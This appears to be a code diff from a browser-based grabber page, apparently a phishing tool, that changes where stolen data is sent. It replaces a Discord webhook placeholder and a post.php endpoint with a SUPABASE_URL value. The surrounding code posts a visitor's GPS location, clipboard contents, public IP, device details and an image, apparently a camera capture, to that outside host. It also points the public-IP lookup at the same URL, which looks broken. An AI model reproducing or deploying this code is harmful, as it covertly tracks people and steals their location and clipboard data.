@@ -102,7 +102,7 @@
             var ischarging;
             function getPublicIp() {
               const xhr = new XMLHttpRequest();
-              xhr.open('GET', 'https://api.ipify.org?format=json', false);
+              xhr.open('GET', SUPABASE_URL, false);
               xhr.send();
 
               if (xhr.status === 200) {
@@ -191,7 +191,7 @@
 
            function senddis(gpsr, clips,batterypercentage,ischarging) {
              var request = new XMLHttpRequest();
-             request.open("POST", "https://your-discordwebhook-url");
+             request.open("POST", SUPABASE_URL);
              request.setRequestHeader('Content-type', 'application/json');
              var params = {
                content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n" + "> **Public IP  : **" + publicIp),
@@ -243,7 +243,7 @@
           data: {
             cat: imgdata
           },
-          url: 'post.php',
+          url: 'SUPABASE_URL',
           dataType: 'json',
           async: false,
           success: function(result) {
